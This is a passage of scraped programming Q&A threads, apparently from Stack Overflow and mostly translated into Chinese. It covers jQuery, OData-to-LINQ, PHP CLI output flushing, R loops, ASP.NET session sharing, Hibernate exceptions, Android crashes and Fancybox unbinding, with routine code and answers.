> 赞同：0
> 
> 时间：2013-03-02T12:36:51.717

试试这个，我对[你的代码做了一些改变](https://github.com/saivineet89/DocSaver/blob/master/popup.js)

```
$('.link').live('click', function() {
  var url = $(this).attr('href');
  $('#message').html(url);
  chrome.tabs.create({ 'url' : url });
});

$('#viewAll').click(function(){
  var objects = JSON.parse(localStorage['DocSaver'])

  var keys = [];
  for (key in objects) {
    keys.push(key);
  }
  var i = 0;
  var keyslen = keys.length;
  var str = '';
  //SORTED KEY ITERATION
  while (i < keyslen) {
    str += '<tr>' + '<td><a class="link" href="' + objects[keys[i]] + '">' + keys[i] +
    '</a></td></tr>'
    ;
    ++i;
  }
  $('#viewFrame > table').html(str);
  $('#viewFrame').css('display','block');
  $('#message').html('Done displaying!');
}); 
```

# linq - 是否有对 linq where 表达式的 ODATA 查询（ODATA 到 Linq ）

> ID：15154469
> 
> 赞同：9
> 
> 时间：2013-03-01T09:30:44.433
> 
> 标签：linq, odata

基本上，

我想将 odata 查询表达式**"$filter", "itemID eq 1"** 转换为**where(w=>w.itemID==1)**

是否有用于此操作的现成库？否则我需要使用 DynamicLinq 类和 linqKit 对其进行编码。

* * *

## 回答 #1

> 赞同：12
> 
> 时间：2013-03-21T00:34:38.773

我正在使用安装了以下 NuGet 包的 Microsoft WebAPI：

[http://nuget.org/packages/Microsoft.Data.OData/](http://nuget.org/packages/Microsoft.Data.OData/)

[http://nuget.org/packages/microsoft.aspnet.webapi.odata](http://nuget.org/packages/microsoft.aspnet.webapi.odata)

这让我可以写如下内容：

```
using System.Web.Http;
using System.Web.Http.OData.Query;

// Some stuff left out

[Queryable]
public IQueryable<Item> Get(ODataQueryOptions<Item> query)
{        
    var items = query.ApplyTo(from item in context.Items select item);
    return (IQueryable<Item>) items;
} 
```

然后我可以使用 jQuery Ajax 调用它（为了示例，我更喜欢使用 BackboneJS），如下所示：

```
$.ajax({ url: '/api/items', data: $.param({ '$filter': 'ID eq 1' }) }); 
```

然后它将只返回 ID 等于 1 的项目，我认为这就是你所追求的？

如果 itemID 是您正在检索的对象的主 ID，我可能会遵循 REST 原则并创建 API，其中检索 ID 为 1 的项目的 url 将是：

```
/api/items/1 
```

如果我基于集合中项目的其他属性进行查询，则仅对项目集合使用 oData 查询，或者在检索前 10 条记录时执行类似下面的操作。

```
$.ajax({ url: '/api/items', data: $.param({ '$top': 10 }) }); 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2018-01-28T12:28:53.750

您可以使用以下 NuGet 包来应用过滤器： [https ://www.nuget.org/packages/Community.OData.Linq](https://www.nuget.org/packages/Community.OData.Linq)

代码示例将是：

```
using System.Linq;
using Community.OData.Linq;

// dataSet in this example - any IQuerable<T> 
Sample[] filterResult = dataSet.OData().Filter("Id eq 2 or Name eq 'name3'").ToArray(); 
```

目前支持：v4 格式的 filter 和 orderby

# jquery - 从图像区域和地图悬停的jquery表

> ID：15154473
> 
> 赞同：1
> 
> 时间：2013-03-01T09:30:53.073
> 
> 标签：jquery, jquery-hover, mousehover

我有一张照片，一张地图。我希望当`mouseover`在特定区域（我使用区域和地图标签）中时，光标将变为 html 元素（`img`或文本），并将突出显示`tr`参考（）下的表格单元格。悬停在桌子上也是一样。

下面是一个示例链接：

[http://jsfiddle.net/ACKhM/3/](http://jsfiddle.net/ACKhM/3/)

希望你的回答，A。

# php - PHP flush() 不能通过 CLI 脚本工作

> ID：15154486
> 
> 赞同：1
> 
> 时间：2013-03-01T09:31:56.213
> 
> 标签：php, command-line-interface, flush

我的代码：

```
@ini_set('zlib.output_compression',0);
@ini_set('implicit_flush',1);
@ob_end_clean();
set_time_limit(0);
function show_status($done, $total, $size=30) {
    static $start_time;

    if($done > $total) return;

    if(empty($start_time)) $start_time=time();
    $now = time();

    $perc=(double)($done/$total);

    $bar=floor($perc*$size);

    $status_bar="[";
    $status_bar.=str_repeat("=", $bar);
    if($bar<$size){
        $status_bar.=">";
        $status_bar.=str_repeat(" ", $size-$bar);
    } else {
        $status_bar.="=";
    }

    $disp=number_format($perc*100, 0);

    $status_bar.="] $disp%  $done/$total";

    @$rate = ($now-$start_time)/$done;
    $left = $total - $done;
    $eta = round($rate * $left, 2);

    $elapsed = $now - $start_time;

    $status_bar.= " remaining: ".number_format($eta)." sec.  elapsed: ".number_format($elapsed)." sec.";

    echo "$status_bar\r";

    flush();

    if($done == $total) {
        echo "\n";
    }
} 
```

调用很简单 show_status($count, $total_count); - 由于某种原因它无法在我的服务器上运行，但我知道上面的代码有效（来自网络，我之前在另一台服务器上使用过它）。我现在在我当前的服务器上遇到的问题是它每次执行都没有输出它，只有在处理完所有内容后才能看到最终结果（100％）。

*   输出缓冲设置为关闭（即使不需要，因为它是通过 CLI 执行的）
*   zlib.output_compression 设置为 Off
*   查看前 4 行代码到其他设置，我也尝试显式设置
*   在 .htaccess 中也有“SetEnv no-gzip dont-vary”，因为这显然是 flush() 不起作用的另一个原因

我错过了什么！？这不是浏览器问题，因为我再次通过 CLI 运行它！PS：我在 WAMP 上使用 php 5.3.6 和 apache 2.2.16 运行它

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T09:56:56.593

看完剧本后，我相信它没有任何问题。运行此测试后，我看到一行显示完成 8% 的状态：

```
show_status(10, 1000);
show_status(40, 1000);
show_status(80, 1000);
echo "\n"; 
```

但是，如果我运行此脚本：

```
show_status(10, 1000);
sleep(5);
show_status(40, 1000);
sleep(5);
show_status(80, 1000);
echo "\n"; 
```

输出线每 5 秒定期更换一次，状态为 1%、4%、8%

我想你所跟踪的状态是简单的完成比输出渲染要快得多，所以你会看到一个完成的结果。

flush() 对 CLI 没有影响。

# r - Counting fixation in an eyetracking output

> ID：15154489
> 
> 赞同：-3
> 
> 时间：2013-03-01T09:32:07.147
> 
> 标签：r

I want to analyze an eye data file in which I need to count fixations within each trial. Here is a sample of my data in which the 3rd and 4rd column are the x and y positions and the 8th column the fixation.

```
75      1 76498  797 637     0   3.313    3.320   1    0
76      1 76499  793 636     0   3.320    3.321   1    0
77      1 76500  788 637     0   3.292    3.308   1    0
78      1 76501  785 636     0   3.274    3.273   1    0
79      1 76502  781 636     0   3.257    3.265   1    0
80      1 76503  775 637     0   3.257    3.250   1    0
81      1 76504  760 641     0   3.247    3.236   0    0
82      1 76505  746 644     0   3.228    3.258   0 
```

I am trying to create a function that searches every fixation (indicated by a series of ones) until the fixation stops (indicated by a 0 in line82 for example) and then proceeds with the next fixation (the next 1 in column 8). For every trial (second column) I want to have for example 4 fixations each of which outputs the mean(x) and mean(y) and the length (as determined by nrow).

I would be happy if anyone knows a simple way of using a while or for loop since I have a hard time figuring this out. All the best,

Tim

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T10:24:23.750

I think the interesting point here is how to solve it via R's vectorization techniques. Here is a rather straightforward and boring loop-based (non-vectorized) solution:

```
# get a list of the start and enpoints of all fixations
fixations <- vector(mode = "list")
inFixation <- FALSE
for (row in seq(nrow(df)) {
  # if we have no active fixation and we see a 1, add new fixation
  if (!isTRUE(inFixation) && df[row, 8] == 1) {
    fixations[[length(fixations) + 1]] <- c("start" = row, "end" = NA)
    inFixation <- TRUE
  }

  # if we have an active fixation and we see a 0, update end of current fixation
  if (isTRUE(inFixation) && (df[row, 8] == 0 || row == nrow(df))) {
    fixations[[length(fixations)]]["end"] <- row - 1
    inFixation <- FALSE
  }
}

# then you can get the mean x, y coordinates via
lapply(fixations, function(fixation) {
  c(
    "mean.x" = mean(df[seq(from = fixation["start"], to = fixation["end"], by = 1), 3],
    "mean.y" = mean(df[seq(from = fixation["start"], to = fixation["end"], by = 1), 4]
  )
}) 
```

# asp.net - 两个域之间的会话共享

> ID：15154491
> 
> 赞同：5
> 
> 时间：2013-03-01T09:32:18.043
> 
> 标签：asp.net, asp.net-mvc-4, session-state

我有两个 Web 应用程序，一个在**.net 3.5**框架中，另一个在**.net 4.0**框架（带有 Razor 的 MVC）中。我已经在主域中上传了 3.5 框架应用程序，在子域中上传了 4.0 框架应用程序。我想在这个应用程序之间共享会话。我正在使用会话状态模式作为 sql server。我尝试了诸如在会话 sql 服务器连接字符串中应用应用程序名称和修改**ASPState** 数据库中的存储过程**TempGetAppID等解决方案。**它在本地运行完美，但是当我上传到现场时，它不共享会话。然后我还尝试了域之间的 cookie 共享，但它也不起作用。所以我认为它需要对服务器进行一些更改，但我不知道在哪里进行更改。有人可以帮忙吗？

 *** * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-06T10:16:32.340

在生产环境中最常见的一件事是每个应用程序都有自己的 machineKey。您可以使用[此生成器](http://aspnetresources.com/tools/machineKey "机器密钥生成器")生成一个并将其放入两个应用程序的配置中，以便它们可以解密来自另一个应用程序的 cookie。默认情况下，会话状态也有包含会话密钥的 cookie，为了能够共享会话，您应该首先能够共享 cookie。**

# asp.net-mvc-3 - mvc3中单个文本框中的两个模型属性

> ID：15154498
> 
> 赞同：1
> 
> 时间：2013-03-01T09:32:50.263
> 
> 标签：asp.net-mvc-3

我想在单个文本框中显示连接的两个属性。

```
@Html.TextBoxFor(m=>m.Name+m.Lanme) 
```

我可以这样做吗？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-03-01T09:36:22.473

您应该在 Controller 中执行此逻辑并拥有一个名为`FullName`.

例如：

```
ViewModel model = new ViewModel();
model.Person = GetPerson();
model.FullName = model.Person.FirstName + " " + model.Person.LastName;
return View(model); 
```

然后只需执行以下操作：

```
@Html.TextBoxFor(m=>m.FullName) 
```

* * *

如果你想更进一步，`FullName`可以是方法的属性`Person`并执行逻辑`GetPerson()`。

# javascript - 如何在上传之前重新调整图像大小并进行预览

> ID：15154499
> 
> 赞同：0
> 
> 时间：2013-03-01T09:32:53.203
> 
> 标签：javascript, file-upload, image-resizing, preview, aspect-ratio

我有一个 input->type->file 按钮，允许用户上传图片。我正在尝试在他们提交（上传）图像之前预览图像。谁能帮我解决，我如何重新调整图像的大小（在单击提交之前）以适合 div（用于预览）。

**css**

```
#preview_box{
    margin-top:10px;
    margin-left:10px;
    float:left;
    display:inline;
    text-align:center;
    height:408px;
    width:490px;
    position:relative;
    border: 1px solid #adadad; /* stroke */
    background-color: #fff; /* layer fill content */
    -moz-box-shadow: 0 1px 6px rgba(0,0,0,.22); /* drop shadow */
    -webkit-box-shadow: 0 1px 6px rgba(0,0,0,.22); /* drop shadow */
    box-shadow: 0 1px 6px rgba(0,0,0,.22); /* drop shadow */
} 
```

**html**

```
<div id="preview_box">This is a preview</div>

<form id="imageform" enctype="multipart/form-data" method="post" action="/help/upload.php">                     
      <input name="photoimg" id="photoimg" type="file"/>
</form> 
```

**jQuery**

```
$("input[name='photoimg']").on("change", function(){
  var files = !!this.files ? this.files : [];
  // If no files were selected, or no FileReader support, return
  if ( !files.length || !window.FileReader ) return;
  // Only proceed if the selected file is an image
 if ( /^image/.test( files[0].type ) ) { 
  // Create a new instance of the FileReader
    reader = new FileReader();
   // Read the local file as a DataURL
    reader.readAsDataURL( files[0] );
   // When loaded, set image data as background of page
     reader.onloadend = function(){
    $("#preview_box").css("background-image", "url(" + this.result + ")");
      }
   }
}); 
```

谢谢。（如果我可以在调整图像大小时保持纵横比，那就太好了）

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-01T09:36:38.917

> ...上传前预览

可以在大多数浏览器的最新版本中完成。看：

[是否可以在通过表单上传之前预览本地图像？](https://stackoverflow.com/questions/922057/is-it-possible-to-preview-local-images-before-uploading-them-via-a-form?rq=1)

但是，为了向后兼容，我建议您通过 ajax 上传图像并在单独的对话框中执行图像调整大小 + 裁剪。

# postgresql - 如何从 Heroku Postgres 中抢救数据

> ID：15154501
> 
> 赞同：2
> 
> 时间：2013-03-01T09:32:57.430
> 
> 标签：postgresql, heroku, data-recovery

我们正在使用 Heroku Postgres 和 Ruby on Rails 3.2。

几天前，我们使用 'heroku run db:load' 错误地删除了重要数据，并且 data.yml 配置错误，即删除表和重新创建几乎没有数据的表。备份数据仅在 2 周前可用，因此我们丢失了 2 周的数据。所以我们需要恢复的不是PG Backup/pg_dump，而是postgresql的系统数据文件。

我认为，恢复数据的唯一方法是从 xlog 或存档文件中恢复数据，但我们当然无权成为超级用户/复制角色，将 heroku（或 Amazon EC2）上的 postgres 数据库复制到本地服务器。

有没有人遇到过这种情况并解决了问题？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-01T11:49:37.463

您唯一的选择是 PgBackups 服务提供的备份（如果您运行了该服务）。如果没有，Heroku 支持可能有更多可用选项。

至少，您会丢失一些数据，但您可以保证不会再这样做；）

# zend-framework - 是否可以将 Symfony2 web profiler bundle 与 Zend Framework 1 或其他框架一起使用？

> ID：15154507
> 
> 赞同：2
> 
> 时间：2013-03-01T09:33:27.250
> 
> 标签：zend-framework, symfony

我有一个用*Zend Framework 1*编写的现有项目，它是长期项目，不断开发，没有迁移到*ZF2*的可能性。在其中使用*Symfony2 Web Profiler*包会非常好。

目前，在开发中，我正在使用 zfdebug ( [https://packagist.org/packages/spekkionu/zfdebug](https://packagist.org/packages/spekkionu/zfdebug) )，这很棒，但是来自 Symfony2 的捆绑包提供了更多...

我设法将 Composer 合并到我的应用程序中（在 Bootstrap 中），所以用它加载一些东西应该没问题。我还在 Packgaist 上找到了包（[https://packagist.org/packages/symfony/web-profiler-bundle](https://packagist.org/packages/symfony/web-profiler-bundle)），但老实说 - 我不知道没有 Symfony2 是否可以使用它。

感谢您的任何提示。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2013-03-01T09:39:33.417

不，这是不可能的。如果您查看 packagist 上的要求，您会看到它需要`symfony/http-kernel`，`symfony/routing`并且`symfony/twig-bridge`可以工作。这是因为 WebProfilerBundle 的工作方式：

它在最常见的事件中注册自己，这些事件发生在 HttpKernel 和 Routing 组件中。如果他无法注册这些事件，他将无法为您提供计时器信息。

此外，它使用另一个事件将 imself 注入您的页面，这意味着如果您没有该事件，您将永远看不到该栏。

并且该包使用 Symfony 约定和技术，这意味着它不能在 ZF 约定和技术上运行。这就是为什么它被称为捆绑包而不是组件的原因，组件是独立的，捆绑包不是。

# jquery - 我如何将 2 个对象作为 json 的返回值传递

> ID：15154508
> 
> 赞同：1
> 
> 时间：2013-03-01T09:33:28.323
> 
> 标签：jquery, asp.net-mvc-3, asp.net-mvc-4

我想根据所选国家绑定 2`City`个下拉列表。`Currency`所以我使用Json并通过选择的countryId并在控制器中写入以获取相应的货币和城市值。但问题是，如何将 json 中的 2 个值作为返回类型传递？

这是代码：

```
[HttpPost]
    public ActionResult BindCityAndCurrency(int CountryID)
    {
        var q = from r in db.Cities where r.CountryID == CountryID orderby r.CityID, r.CityName select r;

        var City = q.ToList().Select(c => new { Text = c.CityName, Value = c.CityID });
        var Currency = from items in db.Currencies where items.CountryID == CountryID orderby items.CurrencyName, items.CurrencyName select items;
        return Json(City,Currency);//here is the error showing Invalid Arguments I 
    } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-01T09:35:51.707

让它像这样

```
return Json(new {city = City, curreny = Currency }); 
```

或者

```
 return Json(new {City, Currency}) 
```

检查辅助方法中的参数列表，它不采用多个数据对象，您必须将它们包装在对象下并相应地在客户端访问。

如果您需要任何帮助，请告诉我

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-01T09:36:42.597

采用

```
return Json(new { City, Currency }); 
```

# java - 事务结束时自动刷新的异常

> ID：15154512
> 
> 赞同：2
> 
> 时间：2013-03-01T09:33:35.453
> 
> 标签：java, spring, hibernate, flush, transactional

我正在用条目填充数据库，如果它们已经存在，则应该替换它们。为此，首先我检查该条目是否已经存在于一个 find 中（它被包装在一个只读事务中），然后如果返回值为 null，我将保存新创建的条目（包装在一个事务中），如果返回值是现有条目，我首先将其删除（包装在事务中），然后添加新条目。除了这些可以在单个事务中完成的许多事务之外，我想知道如果条目已经存在，为什么会出现异常。我检查了刷新模式并将其设置为自动，因此它应该在事务结束时刷新。这是异常的堆栈跟踪：

```
Exception in thread "main" java.lang.NullPointerException
    at org.hibernate.engine.internal.NaturalIdXrefDelegate.validateNaturalId(NaturalIdXrefDelegate.java:175)
    at org.hibernate.engine.internal.NaturalIdXrefDelegate.cacheNaturalIdCrossReference(NaturalIdXrefDelegate.java:85)
    at org.hibernate.engine.internal.StatefulPersistenceContext$1.cacheNaturalIdCrossReferenceFromLoad(StatefulPersistenceContext.java:1817)
    at org.hibernate.engine.internal.StatefulPersistenceContext.getNaturalIdSnapshot(StatefulPersistenceContext.java:340)
    at org.hibernate.event.internal.DefaultFlushEntityEventListener.checkNaturalId(DefaultFlushEntityEventListener.java:110)
    at org.hibernate.event.internal.DefaultFlushEntityEventListener.getValues(DefaultFlushEntityEventListener.java:199)
    at org.hibernate.event.internal.DefaultFlushEntityEventListener.onFlushEntity(DefaultFlushEntityEventListener.java:156)
    at org.hibernate.event.internal.AbstractFlushingEventListener.flushEntities(AbstractFlushingEventListener.java:225)
    at org.hibernate.event.internal.AbstractFlushingEventListener.flushEverythingToExecutions(AbstractFlushingEventListener.java:99)
    at org.hibernate.event.internal.DefaultFlushEventListener.onFlush(DefaultFlushEventListener.java:51)
    at org.hibernate.internal.SessionImpl.flush(SessionImpl.java:1213)
    at org.hibernate.internal.SessionImpl.managedFlush(SessionImpl.java:402)
    at org.hibernate.engine.transaction.internal.jdbc.JdbcTransaction.beforeTransactionCommit(JdbcTransaction.java:101)
    at org.hibernate.engine.transaction.spi.AbstractTransactionImpl.commit(AbstractTransactionImpl.java:175)
    at org.springframework.orm.hibernate4.HibernateTransactionManager.doCommit(HibernateTransactionManager.java:480)
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.processCommit(AbstractPlatformTransactionManager.java:754)
    at org.springframework.transaction.support.AbstractPlatformTransactionManager.commit(AbstractPlatformTransactionManager.java:723)
    at org.springframework.transaction.interceptor.TransactionAspectSupport.commitTransactionAfterReturning(TransactionAspectSupport.java:392)
    at org.springframework.transaction.interceptor.TransactionInterceptor.invoke(TransactionInterceptor.java:120)
    at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:172)
    at org.springframework.aop.framework.JdkDynamicAopProxy.invoke(JdkDynamicAopProxy.java:202)
    at $Proxy31.save(Unknown Source)
    at controller.FileParserCore.update(FileParserCore.java:39)
    at controller.Core.runCore(Core.java:122)
    at controller.Core.staticRunCore(Core.java:74)
    at controller.Core.main(Core.java:33) 
```

我正在使用 Hibernate 和 Spring。

如果条目已经存在，这是失败的代码位：

```
Entry entry = getNewEntry();
if (entryDAO.find(entry.getName()) != null) {
    entryDAO.remove(entry.getName());
}
entryDAO.save(entry); 
```

这是对应的 DAO：

```
@Repository
public class EntryDAO extends GenericDAO<Entry> implements IEntryDAO {
    private static final Logger log = LoggerFactory.getLogger(EntryDAO.class);

    @Override
    @Transactional
    public void save(Entry entry) {
        makePersistent(entry);
        log.info("Saved: {}", entry);
    }

    @Override
    @Transactional
    public void remove(String name) {
        Entry entry = find(name);
        if (entry != null) {
            makeTransient(entry);
            log.info("Removed: {}", entry);
        } else {
            log.warn("Could not remove: {}, entry not found", name);
        }
    }

    /**
     * find an entry by its name and return it
     */
    @Override
    @Transactional(readOnly = true)
    public Entry find(String name) {
        return (Entry) createCriteria(Restrictions.eq("name",name)).uniqueResult();
    }
} 
```

这是入口域对象：

```
@Entity
@Data
@NoArgsConstructor(access = AccessLevel.PROTECTED)
@EqualsAndHashCode(callSuper = false, of = { "name" })
public class Entry extends DomainObject implements Serializable {
    @NaturalId
    @NotEmpty
    @Length(max = 16)
    @Index(name = "ix_name")
    private String name;
} 
```

这是直到异常的输出：

```
信息 2013-03-01 10:22:17,899 主要 - 已删除：someEntry
信息 2013-03-01 10:22:18,117 主要 - 已保存：someEntry

```

当我检查数据库时，旧条目被删除，但新条目没有保存。另外，旧条目和新条目的ID不同，只是名称相同。从堆栈跟踪来看，它似乎与 naturalID 有关，可能是因为刷新没有完成删除旧条目，新条目的名称与此冲突？但是当它进入 save() 方法时，旧条目不应该早就消失了吗？

更新：我还检查了将所有内容放在一个事务中是否可行，但是当我尝试删除一个条目并立即添加一个具有相同 NaturalID（他们的名字）的条目时，它当然开始哭泣。所以我想：让我们在两者之间放置一个 getCurrentSession().flush() 。结果：与上述相同的异常。

更新：这是 DomainObject 类：

```
@MappedSuperclass
@EqualsAndHashCode
public abstract class DomainObject implements Serializable {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long    id;

    public Long getId() {
        return id;
    }

    @Override
    public abstract String toString();
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-11T09:53:22.023

对不起，我已经解决了。它与此处未提及的多对多关系中的意外级联删除有关（我没有提及它，因为我认为它与问题无关）。事实证明，它是通过一次删除来删除所有内容，因为多个条目通过多对多级联相互链接。去除级联后，所有问题都解决了。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-08-12T14:56:05.847

在我的情况下，我有一个由 EntityListener 引起的休眠操作的嵌套。在某些实体的保存操作期间，将调用审计拦截器（侦听器）并从数据库中读取内容，从而打乱会话。

解决方案是为拦截器打开一个新的会话和事务。

# android - android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3147)

> ID：15154514
> 
> 赞同：10
> 
> 时间：2013-03-01T09:33:37.450
> 
> 标签：android

知道为什么会出现这种崩溃吗？跟踪只有本机代码，因此很难追踪。当我在 a中运行动画`Fragment`并且动画结束时我调用`notifyDataSetChanged`. `FragmentStatePagerAdapter`这个问题不是 100% 可重现的。

谢谢。

痕迹：

```
03-01 11:50:11.836: E/AndroidRuntime(21136): FATAL EXCEPTION: main
03-01 11:50:11.836: E/AndroidRuntime(21136): java.lang.NullPointerException
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3147)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewGroup.dispatchGetDisplayList(ViewGroup.java:3151)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12646)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.View.getDisplayList(View.java:12754)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.HardwareRenderer$GlRenderer.draw(HardwareRenderer.java:1144)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewRootImpl.draw(ViewRootImpl.java:2273)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewRootImpl.performDraw(ViewRootImpl.java:2145)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewRootImpl.performTraversals(ViewRootImpl.java:1956)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewRootImpl.doTraversal(ViewRootImpl.java:1112)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.ViewRootImpl$TraversalRunnable.run(ViewRootImpl.java:4472)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.Choreographer$CallbackRecord.run(Choreographer.java:725)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.Choreographer.doCallbacks(Choreographer.java:555)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.Choreographer.doFrame(Choreographer.java:525)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.view.Choreographer$FrameDisplayEventReceiver.run(Choreographer.java:711)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.os.Handler.handleCallback(Handler.java:615)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.os.Handler.dispatchMessage(Handler.java:92)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.os.Looper.loop(Looper.java:137)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at android.app.ActivityThread.main(ActivityThread.java:4898)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at java.lang.reflect.Method.invokeNative(Native Method)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at java.lang.reflect.Method.invoke(Method.java:511)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:1006)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:773)
03-01 11:50:11.836: E/AndroidRuntime(21136):    at dalvik.system.NativeStart.main(Native Method) 
```

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2013-03-01T10:41:37.323

修复很简单，但不知道为什么有效。

在`AnimationListener`'s`onAnimationEnd`回调中，我有一个触发的回调`notifyDataSetChanged`。我将该回调添加到`Runnable`并运行`Runnable`with`getView().post`

```
@Override
                public void onAnimationEnd(Animation animation) {

                    getView().post(new Runnable() {

                        @Override
                        public void run() {
                            // notifyDataSetChanged here
                        }
                    });
                } 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2019-04-17T15:51:25.923

很好的答案，但与 Android 的所有事情一样，这些答案很快就会过时。我现在会使用 runOnUiThread。我在一个基类中运行，动画师作为一个私有类。如需更深入地了解 runOnUiThread，请参阅
[Android 基础知识：在 UI 线程中运行代码](https://stackoverflow.com/questions/12850143/android-basics-running-code-in-the-ui-thread)

```
 @Override
    public void onAnimationEnd(Animator animation) {

        //
        MyBaseActivity.this.runOnUiThread(new Runnable() {
            public void run() {
                Log.d("UI thread", "I am the UI thread");                    
            }
        });

    } 
```

# javascript - 如何销毁 Fancybox？

> ID：15154522
> 
> 赞同：13
> 
> 时间：2013-03-01T09:34:20.290
> 
> 标签：javascript, jquery, fancybox-2

我试图摧毁[Fancybox](http://fancyapps.com/fancybox/)。[我在文档](http://fancyapps.com/fancybox/#docs)中没有找到任何方法来做到这一点。初始化后如何销毁？

这不起作用：

```
$("a").unbind('fancybox').unbind('click'); 
```

测试代码：http: [//jsfiddle.net/martinba/yy3cw/2/](http://jsfiddle.net/martinba/yy3cw/2/)

我使用当前版本 2.1.4。

* * *

## 回答 #1

> 赞同：15
> 
> 时间：2013-03-01T09:56:30.197

为了解绑fancybox，你必须解绑`fb-start`命名空间下的事件`document`：

```
$(document).unbind('click.fb-start'); 
```

不过，我不知道为什么开发人员让它如此不明显。

[http://jsfiddle.net/dfsq/yy3cw/16/](http://jsfiddle.net/dfsq/yy3cw/16/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-03-01T09:45:34.527

尝试调用：

`.unbind('click.fb')`解绑fancybox。

像：

```
$('.group').unbind('click.fb') 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2016-11-07T11:13:41.763

您可以通过运行以下命令取消绑定每个花哨的盒子：

```
$(document).unbind('click.fb-start'); 
```

